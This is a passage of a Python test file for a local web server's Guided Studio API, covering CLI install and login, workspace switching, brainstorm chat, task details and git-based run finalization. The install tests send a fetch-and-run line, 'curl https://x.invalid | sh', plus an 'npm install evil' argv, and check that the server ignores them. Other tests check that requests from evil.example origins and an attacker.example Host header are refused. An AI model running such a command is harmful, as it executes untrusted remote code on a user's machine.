"""HTTP contract tests for the Stage 6 Guided Studio endpoints.

Shared response contract (M1 workers: implement exactly these shapes; errors are always
``{"error": str}`` with the listed status code). CLI shapes are defined in
``tests/test_cli_registry.py`` and ``vibebaton.cli_registry``.

    GET  /api/cli-registry                -> 200 {schema_version: 1, drivers: [CliDriver], tags: [CliTag]}
    POST /api/cli-registry/scan     {}    -> 200 {scan: CliScanResult, lineup: RecommendedLineup}
    POST /api/cli-registry/install  {id, confirmed: true}
                                          -> 200 {id, ok, command, returncode, output}
                                             400 confirmed missing/false; 404 unknown id.
                                             Any client-sent command/argv field is ignored.
    POST /api/cli-registry/login    {id}  -> 200 {id, launched, command, message_en, message_zh}
                                             404 unknown id; 409 driver binary not installed
    GET  /api/workspace/info              -> 200 WorkspaceInfo
                                             {path, is_git_repo, branch: str|null, has_commits, has_rfc}
    POST /api/workspace/select      {path}-> 200 WorkspaceInfo of the new absolute directory (server switches repo)
                                             400 missing/relative/nonexistent path or not a directory
    POST /api/workspace/init-git    {}    -> 200 {...WorkspaceInfo, created: bool}  (branch "main"; idempotent)
    POST /api/brainstorm/chat       {messages: [{role, content}], scenario?: id|null, offline?: bool}
                                          -> 200 BrainstormTurnResult {reply, rfc_markdown, blueprint, provider_used, offline}
                                             (never writes .baton/00_RFC.md); 400 bad messages / unknown scenario
    POST /api/brainstorm/confirm    {rfc_markdown}
                                          -> 200 {rfc_path, readiness: RFCReadiness, ready_to_launch}; 400 blank
    POST /api/runs/start            {..., role_providers?: {role: provider_id}}
                                          -> role_providers (the Guided lineup) become "provider:model"
                                             model_overrides for moved roles (model from the role's fallback,
                                             else any role targeting that provider); explicit model_overrides
                                             win; 400 unknown role/provider or no configured model
    GET  /api/runs/<id>/tasks/<task_id>   -> 200 TaskDetail {run_id, task_id, milestone_id, title, tier, status,
                                             summary (plain-language sentence), provider: str|null, model: str|null,
                                             elapsed_sec: float, cost_usd: float, changed_files: [str],
                                             test_status: "passed"|"failed"|"not_run"|"not_configured",
                                             review_verdict: str|null, attempts: int}
                                             404 unknown run or task
    POST /api/runs/<id>/resolve     legacy canvas {decision: "approve"|"reject", note?: str}
                                          -> 200 {run_id, decision, daemon_pid: int|null}
                                    GuidedDecisionModal {task_id, choice: "approve"|"reject", note?: str}
                                          -> 200 {ok: true, run_id, task_id, status}
                                             approve -> run "RUNNING" + daemon respawn; reject -> run "PAUSED".
                                             400 bad decision/choice or missing task_id; 404 unknown run or task
    POST /api/runs/<id>/finalize    {action: "approve"|"revise"|"rollback", note?: str}
                                          -> 200 {ok: true, run_id, action, status, backup_tag: str|null,
                                                  base_branch, base_head, ...action extras}
                                             approve (run must be READY_FOR_FINAL_GATE): ensure the lightweight
                                               tag baton-backup/<run_id> on the base branch (kept if the run start
                                               already made it), then squash-merge the dev branch with
                                               merge_branch_into; status "COMPLETED"; extras {merged_commit,
                                               changed_files (diff of the base head just before the merge
                                               vs merged_commit)}. The pre-merge base head is recorded.
                                             revise: requires non-empty note, appended to
                                               .baton/runs/<run_id>/revisions.md; no git change; status "PAUSED";
                                               extras {revisions_path}.
                                             rollback (run COMPLETED via approve, base head still the merge):
                                               check out the base branch and hard-reset it to the recorded
                                               pre-merge head (no reset for a no-op merge), so base commits made
                                               during the run survive; status "PAUSED"; extras {restored_to}.
                                             400 bad action / revise without note; 404 unknown run; 409 approve on a
                                             run not READY_FOR_FINAL_GATE, missing backup tag, uncommitted changes
                                             outside .baton/, or any failing git operation
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import tempfile
import unittest
import unittest.mock
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from urllib.request import Request

from vibebaton import brainstorm
from vibebaton.brainstorm import SCENARIOS, brainstorm_turn, confirm_blueprint
from vibebaton.cli_registry import load_cli_registry
from vibebaton.db import StateStore
from vibebaton.git_ops import GitError, create_backup_tag, restore_backup_tag
from vibebaton.rfc_checker import check_rfc_readiness
from vibebaton.schemas import MilestoneSpec, PlanDAG, RunStatus, TaskSpec, TaskStatus

from tests.test_cli_registry import HTTP_KEY_ENVS, fake_cli_env, fake_calls
from tests.test_web_server import WebServerTestCase

WORKSPACE_FIELDS = {"path", "is_git_repo", "branch", "has_commits", "has_rfc"}
BLUEPRINT_FIELDS = {
    "title", "summary", "deliverables", "touched_areas", "verification_plan", "readiness_score", "ready_to_launch",
}
TASK_DETAIL_FIELDS = {
    "run_id", "task_id", "milestone_id", "title", "tier", "status", "summary", "provider", "model",
    "elapsed_sec", "cost_usd", "changed_files", "test_status", "review_verdict", "attempts",
}
FINALIZE_FIELDS = {"ok", "run_id", "action", "status", "backup_tag", "base_branch", "base_head"}
CONDESCENDING = re.compile(r"小白|菜鸟|傻瓜|笨蛋|noob|dummy", re.IGNORECASE)
GIT_IDENTITY = {
    "GIT_AUTHOR_NAME": "VibeBaton Test",
    "GIT_AUTHOR_EMAIL": "test@vibebaton.invalid",
    "GIT_COMMITTER_NAME": "VibeBaton Test",
    "GIT_COMMITTER_EMAIL": "test@vibebaton.invalid",
}


def _git(repo: Path, *args: str) -> str:
    result = subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True, check=True)
    return result.stdout.strip()


def _init_repo(repo: Path) -> None:
    _git(repo, "init", "-q", "-b", "main")
    (repo / ".gitignore").write_text(".baton/\n", encoding="utf-8")
    (repo / "README.md").write_text("# Guided test repo\n", encoding="utf-8")
    _git(repo, "add", ".")
    _git(repo, "commit", "-q", "-m", "init")


class GuidedApiTestCase(WebServerTestCase):
    """Fresh loopback server over a temp git repo (``main`` with one commit, ``.baton/`` ignored)."""

    def setUp(self) -> None:
        super().setUp()  # scrubs credential env vars inside patch.dict(os.environ)
        for key in HTTP_KEY_ENVS:
            os.environ.pop(key, None)
        os.environ.update(GIT_IDENTITY)
        _init_repo(self.repo)
        self.store = StateStore(self.repo / ".baton" / "state.sqlite")

    def _get(self, path: str) -> tuple[int, Any]:
        status, _, body = self.get(path)
        return status, body

    def _post(self, path: str, payload: dict[str, Any] | None = None) -> tuple[int, Any]:
        status, _, body = self.send_json(path, payload or {})
        return status, body

    def assert_error(self, response: tuple[int, Any], status: int) -> None:
        self.assertEqual(response[0], status, response[1])
        self.assertIsInstance(response[1], dict)
        self.assertIsInstance(response[1].get("error"), str)

    def seed_run(self, status: RunStatus = RunStatus.RUNNING) -> str:
        rfc = self.repo / ".baton" / "00_RFC.md"
        rfc.write_text("# Seeded RFC\n", encoding="utf-8")
        run_id = self.store.create_run(self.repo, rfc)
        plan = PlanDAG(
            rfc_version="v1.0",
            complexity_tier="S",
            milestones=[
                MilestoneSpec(
                    id="M1",
                    title="Guided milestone",
                    tasks=[TaskSpec(id="M1-T1", title="Write the greeting", description="Say hello")],
                )
            ],
        )
        self.store.register_plan(run_id, plan)
        if status is not RunStatus.PENDING:
            self.store.update_run_status(run_id, status, human_prompt="Need a decision")
        return run_id


class TestGuidedRunStartLineup(GuidedApiTestCase):
    """POST /api/runs/start {role_providers}: the Guided lineup becomes provider:model overrides."""

    CODEX_ONLY = {
        "brainstorm_and_final_gate": "codex_sub",
        "tactical_planner": "codex_sub",
        "milestone_reviewer": "codex_sub",
        "micro_orchestrator": "codex_sub",
        "critical_executor": "codex_sub",
        "bulk_worker": "codex_sub",
    }

    def _start(self, **extra: Any) -> tuple[int, Any]:
        return self._post("/api/runs/start", {"rfc_markdown": "# RFC\n\nLineup.\n", **extra})

    def test_codex_only_lineup_overrides_every_moved_role(self) -> None:
        status, body = self._start(role_providers=self.CODEX_ONLY)
        self.assertEqual(status, 201, body)
        overrides = json.loads(self.store.get_run(body["run_id"])["model_overrides_json"])
        self.assertEqual(overrides, {
            "brainstorm_and_final_gate": "codex_sub:gpt-6.2-sol@high",
            "tactical_planner": "codex_sub:gpt-6.2-sol@high",
            "milestone_reviewer": "codex_sub:gpt-6.2-astra@xhigh",
            "bulk_worker": "codex_sub:gpt-6.2-sol@max",
        })
        cfg = self.server.loader.current
        for role in self.CODEX_ONLY:
            resolved, provider = cfg.resolve_role(role, model_overrides=overrides)
            self.assertEqual(resolved.provider, "codex_sub", role)
            self.assertIsNotNone(provider)

    def test_explicit_model_overrides_win_over_lineup(self) -> None:
        status, body = self._start(
            role_providers={"tactical_planner": "codex_sub"},
            model_overrides={"tactical_planner": "codex_sub:gpt-6.2-sol@max"},
        )
        self.assertEqual(status, 201, body)
        overrides = json.loads(self.store.get_run(body["run_id"])["model_overrides_json"])
        self.assertEqual(overrides, {"tactical_planner": "codex_sub:gpt-6.2-sol@max"})

    def test_bad_role_providers_are_rejected_without_a_run(self) -> None:
        for role_providers in (
            ["codex_sub"],
            {"tactical_planner": 1},
            {"no_such_role": "codex_sub"},
            {"tactical_planner": "no_such_provider"},
        ):
            with self.subTest(role_providers=role_providers):
                self.assert_error(self._start(role_providers=role_providers), 400)
        self.assertEqual(self.spawn_calls, [])


class TestCliRegistryApi(GuidedApiTestCase):
    def test_get_registry_returns_catalog_and_tags(self) -> None:
        status, body = self._get("/api/cli-registry")
        self.assertEqual(status, 200)
        self.assertEqual(body, load_cli_registry())

    def test_scan_returns_scan_and_lineup(self) -> None:
        with fake_cli_env(installed={"node", "claude"}, authenticated={"claude"}):
            status, body = self._post("/api/cli-registry/scan")
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), {"scan", "lineup"})
        self.assertEqual(set(body["scan"]), {"drivers", "http_api_keys_present", "scanned_at"})
        claude = next(entry for entry in body["scan"]["drivers"] if entry["id"] == "claude")
        self.assertEqual(claude["status"], "ready")
        self.assertIs(body["lineup"]["ready"], True)
        self.assertEqual(body["lineup"]["source"], "cli")
        self.assertEqual(set(body["lineup"]["roles"].values()), {"claude_sub"})

    def test_scan_with_only_an_http_key_is_still_ready(self) -> None:
        os.environ["GEMINI_API_KEY"] = "gm-secret-value"
        with fake_cli_env():
            status, body = self._post("/api/cli-registry/scan")
        self.assertEqual(status, 200, body)
        self.assertEqual(body["scan"]["http_api_keys_present"], ["GEMINI_API_KEY"])
        self.assertIs(body["lineup"]["ready"], True)
        self.assertEqual(body["lineup"]["source"], "http")
        self.assertNotIn("gm-secret-value", json.dumps(body))

    def test_install_runs_confirmed_registry_recipe_only(self) -> None:
        install_cmd = load_cli_registry()["drivers"][0]["install_cmd"]
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            status, body = self._post(
                "/api/cli-registry/install",
                {
                    "id": "claude",
                    "confirmed": True,
                    "command": ["bash", "-c", "curl https://x.invalid | sh"],
                    "install_cmd": "curl https://x.invalid | sh",
                },
            )
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), {"id", "ok", "command", "returncode", "output"})
        self.assertEqual((body["id"], body["ok"], body["returncode"]), ("claude", True, 0))
        self.assertEqual(body["command"], install_cmd)
        self.assertEqual(fake_calls(fakes["run"]), [["/fake/bin/npm", *install_cmd[1:]]])
        self.assertNotIn("bash", json.dumps([call.args for call in fakes["run"].call_args_list]))

    def test_install_ignores_client_argv(self) -> None:
        install_cmd = load_cli_registry()["drivers"][0]["install_cmd"]
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            status, body = self._post(
                "/api/cli-registry/install", {"id": "claude", "confirmed": True, "argv": ["npm", "install", "evil"]}
            )
        self.assertEqual(status, 200, body)
        self.assertEqual(body["command"], install_cmd)
        self.assertEqual(fake_calls(fakes["run"]), [["/fake/bin/npm", *install_cmd[1:]]])

    def test_install_rejects_unconfirmed_and_unknown(self) -> None:
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            self.assert_error(self._post("/api/cli-registry/install", {"id": "claude"}), 400)
            self.assert_error(self._post("/api/cli-registry/install", {"id": "claude", "confirmed": False}), 400)
            self.assert_error(self._post("/api/cli-registry/install", {"id": "claude", "confirmed": "yes"}), 400)
            self.assert_error(self._post("/api/cli-registry/install", {"id": "nope", "confirmed": True}), 404)
            self.assert_error(self._post("/api/cli-registry/install", {"confirmed": True}), 400)
        self.assertEqual(fake_calls(fakes["run"]), [])

    def test_login_launches_official_flow(self) -> None:
        login_cmd = load_cli_registry()["drivers"][0]["login_cmd"]
        with fake_cli_env(installed={"node", "claude"}) as fakes:
            status, body = self._post("/api/cli-registry/login", {"id": "claude"})
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), {"id", "launched", "command", "message_en", "message_zh"})
        self.assertIs(body["launched"], True)
        self.assertEqual(body["command"], login_cmd)
        self.assertEqual(fake_calls(fakes["popen"]), [["/fake/bin/claude", *login_cmd[1:]]])

    def test_login_errors(self) -> None:
        with fake_cli_env(installed={"node"}) as fakes:
            self.assert_error(self._post("/api/cli-registry/login", {"id": "nope"}), 404)
            self.assert_error(self._post("/api/cli-registry/login", {"id": "claude"}), 409)
        self.assertEqual(fake_calls(fakes["popen"]), [])


class TestCrossOriginGuard(GuidedApiTestCase):
    """Browser pages from other origins must not reach command-running or state-changing routes."""

    INSTALL = json.dumps({"id": "claude", "confirmed": True}).encode("utf-8")

    def _raw(self, path: str, headers: dict[str, str], method: str = "POST", data: bytes | None = None) -> tuple[int, Any, Any]:
        return self._request(Request(self.base + path, data=data, headers=headers, method=method))

    def test_foreign_origin_install_is_forbidden_and_installer_never_runs(self) -> None:
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            status, headers, body = self._raw(
                "/api/cli-registry/install",
                {"Content-Type": "application/json", "Origin": "https://evil.example"},
                data=self.INSTALL,
            )
        self.assertEqual(status, 403, body)
        self.assertIsNone(headers.get("Access-Control-Allow-Origin"))
        self.assertEqual(fake_calls(fakes["run"]), [])

    def test_text_plain_install_is_rejected_and_installer_never_runs(self) -> None:
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            status, _, body = self._raw("/api/cli-registry/install", {"Content-Type": "text/plain"}, data=self.INSTALL)
        self.assertEqual(status, 415, body)
        self.assertEqual(fake_calls(fakes["run"]), [])

    def test_non_loopback_host_header_is_forbidden(self) -> None:
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            status, _, body = self._raw(
                "/api/cli-registry/install",
                {"Content-Type": "application/json", "Host": "attacker.example:7860"},
                data=self.INSTALL,
            )
        self.assertEqual(status, 403, body)
        self.assertEqual(fake_calls(fakes["run"]), [])
        self.assertEqual(self._raw("/api/health", {"Host": "rebind.example"}, method="GET")[0], 403)

    def test_foreign_origin_cannot_switch_workspace_or_write_rfc(self) -> None:
        other = Path(self.enterContext(tempfile.TemporaryDirectory()))
        evil = {"Content-Type": "application/json", "Origin": "null"}
        select = json.dumps({"path": str(other)}).encode("utf-8")
        confirm = json.dumps({"rfc_markdown": "# Evil"}).encode("utf-8")
        self.assertEqual(self._raw("/api/workspace/select", evil, data=select)[0], 403)
        self.assertEqual(self._raw("/api/brainstorm/confirm", evil, data=confirm)[0], 403)
        self.assertEqual(self._get("/api/workspace/info")[1]["path"], str(self.repo.resolve()))
        self.assertFalse((self.repo / ".baton" / "00_RFC.md").exists())

    def test_foreign_preflight_is_refused_and_loopback_origin_is_echoed(self) -> None:
        preflight = {"Access-Control-Request-Method": "POST"}
        status, headers, _ = self._raw("/api/cli-registry/install", {**preflight, "Origin": "https://evil.example"}, "OPTIONS")
        self.assertEqual(status, 403)
        self.assertIsNone(headers.get("Access-Control-Allow-Origin"))
        status, headers, _ = self._raw("/api/health", {"Origin": "https://evil.example"}, "GET")
        self.assertEqual(status, 200)
        self.assertIsNone(headers.get("Access-Control-Allow-Origin"))
        for origin in ("http://localhost:5173", self.base):
            with self.subTest(origin=origin):
                status, headers, _ = self._raw("/api/cli-registry/install", {**preflight, "Origin": origin}, "OPTIONS")
                self.assertEqual(status, 204)
                self.assertEqual(headers["Access-Control-Allow-Origin"], origin)

    def test_same_origin_json_post_still_works(self) -> None:
        with fake_cli_env(installed={"node", "npm"}) as fakes:
            status, _, body = self._raw(
                "/api/cli-registry/install",
                {"Content-Type": "application/json; charset=utf-8", "Origin": self.base},
                data=self.INSTALL,
            )
        self.assertEqual(status, 200, body)
        self.assertEqual(len(fake_calls(fakes["run"])), 1)


class TestWorkspaceApi(GuidedApiTestCase):
    def test_info_describes_current_repo(self) -> None:
        status, body = self._get("/api/workspace/info")
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), WORKSPACE_FIELDS)
        self.assertEqual(body["path"], str(self.repo))
        self.assertEqual((body["is_git_repo"], body["branch"], body["has_commits"]), (True, "main", True))
        self.assertIs(body["has_rfc"], False)

    def test_select_then_init_git(self) -> None:
        target = Path(self.enterContext(tempfile.TemporaryDirectory())).resolve()
        status, body = self._post("/api/workspace/select", {"path": str(target)})
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), WORKSPACE_FIELDS)
        self.assertEqual(body["path"], str(target))
        self.assertEqual((body["is_git_repo"], body["branch"], body["has_commits"]), (False, None, False))
        self.assertEqual(self._get("/api/workspace/info")[1]["path"], str(target))

        status, body = self._post("/api/workspace/init-git")
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), WORKSPACE_FIELDS | {"created"})
        self.assertEqual((body["created"], body["is_git_repo"], body["branch"]), (True, True, "main"))
        self.assertTrue((target / ".git").is_dir())

        status, body = self._post("/api/workspace/init-git")
        self.assertEqual(status, 200, body)
        self.assertIs(body["created"], False)

    def test_select_rebinds_workspace_config_for_budget_updates(self) -> None:
        target = Path(self.enterContext(tempfile.TemporaryDirectory())).resolve()
        _init_repo(target)
        example_cfg = (Path(__file__).resolve().parents[1] / "baton.example.toml").read_text(encoding="utf-8")
        (target / ".baton").mkdir(parents=True, exist_ok=True)
        (target / ".baton" / "baton.toml").write_text(example_cfg, encoding="utf-8")

        status, body = self._post("/api/workspace/select", {"path": str(target)})
        self.assertEqual(status, 200, body)
        self.assertEqual(self.server.loader.path, (target / ".baton" / "baton.toml").resolve())

        put_status, _, put_body = self.send_json("/api/config/budget", {"budget_profile": "eco"}, method="PUT")
        self.assertEqual(put_status, 200, put_body)
        self.assertEqual(put_body["budget_profile"], "eco")

    def test_select_rejects_invalid_paths(self) -> None:
        missing = self.repo / "does-not-exist"
        a_file = self.repo / "README.md"
        for payload in ({}, {"path": ""}, {"path": 7}, {"path": "relative/dir"}, {"path": str(missing)},
                        {"path": str(a_file)}, {"path": f"{self.repo}\0"}, {"path": f"{self.repo}\n"}):
            with self.subTest(payload=payload):
                self.assert_error(self._post("/api/workspace/select", payload), 400)
        self.assertEqual(self._get("/api/workspace/info"), (200, unittest.mock.ANY))
        self.assertEqual(self._get("/api/workspace/info")[1]["path"], str(self.repo))


class TestBrainstormApi(GuidedApiTestCase):
    MESSAGES = [{"role": "user", "content": "Add a /health endpoint that reports the app version."}]

    def test_offline_chat_returns_blueprint_without_writing_rfc(self) -> None:
        payload = {"messages": self.MESSAGES, "scenario": "new_feature", "offline": True}
        status, body = self._post("/api/brainstorm/chat", payload)
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), {"reply", "rfc_markdown", "blueprint", "provider_used", "offline"})
        self.assertIs(body["offline"], True)
        self.assertIsNone(body["provider_used"])
        self.assertTrue(body["reply"].strip())
        self.assertTrue(body["rfc_markdown"].startswith("# "))
        blueprint = body["blueprint"]
        self.assertEqual(set(blueprint), BLUEPRINT_FIELDS)
        for field in ("deliverables", "touched_areas", "verification_plan"):
            self.assertIsInstance(blueprint[field], list)
            self.assertTrue(all(isinstance(item, str) for item in blueprint[field]))
        self.assertIsInstance(blueprint["readiness_score"], int)
        self.assertTrue(0 <= blueprint["readiness_score"] <= 100)
        self.assertIsInstance(blueprint["ready_to_launch"], bool)
        self.assertIsNone(CONDESCENDING.search(json.dumps(body, ensure_ascii=False)))
        self.assertFalse((self.repo / ".baton" / "00_RFC.md").exists())
        # Deterministic offline composer: same input, same output.
        self.assertEqual(self._post("/api/brainstorm/chat", payload), (200, body))

    def test_multi_turn_chat_accepts_history(self) -> None:
        messages = [
            *self.MESSAGES,
            {"role": "assistant", "content": "Which framework serves the app?"},
            {"role": "user", "content": "The stdlib http.server; verify with python -m unittest."},
        ]
        status, body = self._post("/api/brainstorm/chat", {"messages": messages, "offline": True})
        self.assertEqual(status, 200, body)
        self.assertTrue(body["rfc_markdown"].startswith("# "))

    def test_offline_chat_supports_chinese_locale_and_zh_input(self) -> None:
        status, body = self._post(
            "/api/brainstorm/chat",
            {"messages": [{"role": "user", "content": "新增一个健康检查接口"}], "scenario": "new_feature", "offline": True, "locale": "zh"},
        )
        self.assertEqual(status, 200, body)
        self.assertIn("蓝图", body["reply"])
        self.assertIn("交付一个新功能", body["reply"])

    def test_offline_chat_handles_punctuation_only_cjk_turn(self) -> None:
        status, body = self._post(
            "/api/brainstorm/chat",
            {"messages": [{"role": "user", "content": "？？？"}], "offline": True, "locale": "zh"},
        )
        self.assertEqual(status, 200, body)
        self.assertTrue(body["rfc_markdown"].startswith("# "))

    def test_chat_rejects_bad_payloads(self) -> None:
        for payload in (
            {},
            {"messages": []},
            {"messages": "hello"},
            {"messages": [{"role": "system", "content": "x"}]},
            {"messages": [{"role": "user", "content": 3}]},
            {"messages": [{"role": "assistant", "content": "last turn must be the user"}]},
            {"messages": self.MESSAGES, "scenario": "not-a-scenario", "offline": True},
        ):
            with self.subTest(payload=payload):
                self.assert_error(self._post("/api/brainstorm/chat", payload), 400)

    def test_confirm_writes_rfc_and_scores_it(self) -> None:
        rfc = (
            "# Health endpoint\n\n## Goals\n\n- Add GET /health.\n\n## Constraints\n\n- Stdlib only.\n\n"
            "## Verification & Acceptance Criteria\n\n```bash\npython -m unittest discover -s tests\n```\n"
        )
        status, body = self._post("/api/brainstorm/confirm", {"rfc_markdown": rfc})
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), {"rfc_path", "readiness", "ready_to_launch"})
        rfc_path = self.repo / ".baton" / "00_RFC.md"
        self.assertEqual(Path(body["rfc_path"]), rfc_path)
        self.assertEqual(rfc_path.read_text(encoding="utf-8"), rfc)
        self.assertEqual(
            set(body["readiness"]), {"score", "safe_for_overnight", "missing_sections", "warnings", "detected_commands"}
        )
        self.assertEqual(body["ready_to_launch"], body["readiness"]["safe_for_overnight"])
        self.assertIs(self._get("/api/workspace/info")[1]["has_rfc"], True)

    def test_confirm_rejects_blank_markdown(self) -> None:
        for payload in ({}, {"rfc_markdown": "   "}, {"rfc_markdown": 1}):
            with self.subTest(payload=payload):
                self.assert_error(self._post("/api/brainstorm/confirm", payload), 400)
        self.assertFalse((self.repo / ".baton" / "00_RFC.md").exists())


class TestRunGuidedApi(GuidedApiTestCase):
    def test_task_detail(self) -> None:
        run_id = self.seed_run()
        self.store.update_task(run_id, "M1-T1", status=TaskStatus.PASSED, duration_sec=12.5)
        status, body = self._get(f"/api/runs/{run_id}/tasks/M1-T1")
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), TASK_DETAIL_FIELDS)
        self.assertEqual((body["run_id"], body["task_id"], body["milestone_id"]), (run_id, "M1-T1", "M1"))
        self.assertEqual((body["title"], body["status"]), ("Write the greeting", "PASSED"))
        self.assertEqual(body["elapsed_sec"], 12.5)
        self.assertEqual((body["tier"], body["attempts"], body["test_status"]), ("routine", 0, "not_configured"))
        self.assertIn("Write the greeting", body["summary"])
        self.assertIn("passed", body["summary"])
        self.assertIsInstance(body["cost_usd"], float)
        self.assertIsInstance(body["changed_files"], list)
        for field in ("provider", "model", "review_verdict"):
            self.assertIsInstance(body[field], (str, type(None)), field)

        status_zh, body_zh = self._get(f"/api/runs/{run_id}/tasks/M1-T1?lang=zh")
        self.assertEqual(status_zh, 200, body_zh)
        self.assertEqual(set(body_zh), TASK_DETAIL_FIELDS)
        self.assertIn("Write the greeting", body_zh["summary"])
        self.assertIn("已完成", body_zh["summary"])

    def test_task_detail_reports_changed_files_from_engine_events(self) -> None:
        run_id = self.seed_run()
        # Same shape the engine logs after the path-whitelist check; the latest attempt wins.
        for attempt, files in ((1, ["src/old.py"]), (2, ["src/hello.py", "tests/test_hello.py"])):
            self.store.log_event(
                run_id, "task_changes", task_id="M1-T1", milestone_id="M1",
                message=f"attempt {attempt}", payload={"changed_files": files},
            )
        status, body = self._get(f"/api/runs/{run_id}/tasks/M1-T1")
        self.assertEqual(status, 200, body)
        self.assertEqual(body["changed_files"], ["src/hello.py", "tests/test_hello.py"])

    def test_task_detail_not_found(self) -> None:
        run_id = self.seed_run()
        self.assert_error(self.get(f"/api/runs/{run_id}/tasks/M9-T9")[::2], 404)
        self.assert_error(self.get("/api/runs/run-missing/tasks/M1-T1")[::2], 404)

    def test_resolve_approve_resumes_daemon(self) -> None:
        run_id = self.seed_run(RunStatus.WAITING_HUMAN)
        status, body = self._post(f"/api/runs/{run_id}/resolve", {"decision": "approve", "note": "Looks right"})
        self.assertEqual(status, 200, body)
        self.assertEqual(body, {"run_id": run_id, "decision": "approve", "daemon_pid": 4242})
        self.assertEqual(self.spawn_calls, [(self.repo, self.config_path, run_id)])
        self.assertEqual(self.store.get_run(run_id)["status"], "RUNNING")

    def test_resolve_reject_pauses_without_daemon(self) -> None:
        run_id = self.seed_run(RunStatus.WAITING_HUMAN)
        status, body = self._post(f"/api/runs/{run_id}/resolve", {"decision": "reject"})
        self.assertEqual(status, 200, body)
        self.assertEqual(body, {"run_id": run_id, "decision": "reject", "daemon_pid": None})
        self.assertEqual(self.spawn_calls, [])
        self.assertEqual(self.store.get_run(run_id)["status"], "PAUSED")

    def test_resolve_errors(self) -> None:
        waiting = self.seed_run(RunStatus.WAITING_HUMAN)
        self.assert_error(self._post(f"/api/runs/{waiting}/resolve", {"decision": "maybe"}), 400)
        self.assert_error(self._post("/api/runs/run-missing/resolve", {"decision": "approve"}), 404)
        self.assertEqual(self.spawn_calls, [])

    def test_guided_resolve_round_trip(self) -> None:
        run_id = self.seed_run(RunStatus.WAITING_HUMAN)
        self.store.update_task(run_id, "M1-T1", status=TaskStatus.WAITING_HUMAN)
        payload = {"task_id": "M1-T1", "choice": "approve", "note": "Keep the friendly tone"}
        status, body = self._post(f"/api/runs/{run_id}/resolve", payload)
        self.assertEqual(status, 200, body)
        self.assertEqual(body, {"ok": True, "run_id": run_id, "task_id": "M1-T1", "status": "RUNNING"})
        self.assertEqual(self.spawn_calls, [(self.repo, self.config_path, run_id)])
        recorded = json.loads(self.store.get_run(run_id)["human_decision"])
        self.assertEqual(
            (recorded["decision"], recorded["note"], recorded["task_id"]), ("approve", "Keep the friendly tone", "M1-T1")
        )
        events = self.store.get_events(run_id, task_id="M1-T1", limit=-1)
        self.assertIn("human_decision", [event["kind"] for event in events])

        status, body = self._post(f"/api/runs/{run_id}/resolve", {"task_id": "M1-T1", "choice": "reject"})
        self.assertEqual(status, 200, body)
        self.assertEqual(body, {"ok": True, "run_id": run_id, "task_id": "M1-T1", "status": "PAUSED"})
        self.assertEqual(len(self.spawn_calls), 1)

    def test_guided_resolve_errors(self) -> None:
        run_id = self.seed_run(RunStatus.WAITING_HUMAN)
        path = f"/api/runs/{run_id}/resolve"
        self.assert_error(self._post(path, {"task_id": "M1-T1", "choice": "maybe"}), 400)
        self.assert_error(self._post(path, {"choice": "approve"}), 400)
        self.assert_error(self._post(path, {"task_id": "M1-T1", "choice": "approve", "note": 3}), 400)
        self.assert_error(self._post(path, {"task_id": "M9-T9", "choice": "approve"}), 404)
        self.assertEqual(self.spawn_calls, [])
        self.assertEqual(self.store.get_run(run_id)["status"], "WAITING_HUMAN")

    def _prepare_dev_branch(self) -> tuple[str, str]:
        base_head = _git(self.repo, "rev-parse", "main")
        _git(self.repo, "checkout", "-q", "-b", "dev")
        (self.repo / "feature.txt").write_text("from the relay\n", encoding="utf-8")
        _git(self.repo, "add", "feature.txt")
        _git(self.repo, "commit", "-q", "-m", "feature")
        dev_head = _git(self.repo, "rev-parse", "dev")
        _git(self.repo, "checkout", "-q", "main")
        return base_head, dev_head

    def test_finalize_approve_tags_backup_then_merges_dev(self) -> None:
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        base_head, dev_head = self._prepare_dev_branch()
        status, body = self._post(f"/api/runs/{run_id}/finalize", {"action": "approve"})
        self.assertEqual(status, 200, body)
        self.assertEqual(set(body), FINALIZE_FIELDS | {"merged_commit", "changed_files"})
        tag = f"baton-backup/{run_id}"
        self.assertEqual(
            (body["ok"], body["action"], body["status"], body["backup_tag"]), (True, "approve", "COMPLETED", tag)
        )
        self.assertEqual(body["base_branch"], "main")
        self.assertEqual(_git(self.repo, "tag", "--list", tag), tag)
        self.assertEqual(_git(self.repo, "rev-parse", f"{tag}^{{commit}}"), base_head)
        self.assertEqual(body["base_head"], _git(self.repo, "rev-parse", "main"))
        self.assertEqual(body["merged_commit"], body["base_head"])
        self.assertEqual(body["changed_files"], ["feature.txt"])
        # merge_branch_into squash-merges: main gains one commit carrying the dev branch's content.
        self.assertEqual(_git(self.repo, "rev-parse", "main^"), base_head)
        self.assertEqual(_git(self.repo, "diff", dev_head, "main"), "")
        self.assertEqual(_git(self.repo, "symbolic-ref", "--short", "HEAD"), "main")
        self.assertEqual((self.repo / "feature.txt").read_text(encoding="utf-8"), "from the relay\n")
        self.assertEqual(self.store.get_run(run_id)["status"], "COMPLETED")

    def test_finalize_approve_keeps_tag_created_at_run_start(self) -> None:
        run_id = self.seed_run(RunStatus.READY_FOR_FINAL_GATE)
        base_head = _git(self.repo, "rev-parse", "main")
        self.assertEqual(create_backup_tag(self.repo, run_id, "main"), f"baton-backup/{run_id}")
        (self.repo / "later.txt").write_text("landed after the run started\n", encoding="utf-8")
        _git(self.repo, "add", "later.txt")
        _git(self.repo, "commit", "-q", "-m", "later")
        _git(self.repo, "branch", "dev")
        status, body = self._post(f"/api/runs/{run_id}/finalize", {"action": "approve"})
        self.assertEqual(status, 200, body)
        self.assertEqual(_git(self.repo, "rev-parse", f"baton-backup/{run_id}^{{commit}}"), base_head)
        # changed_files covers only the run's merge, not commits that landed on main during the run.
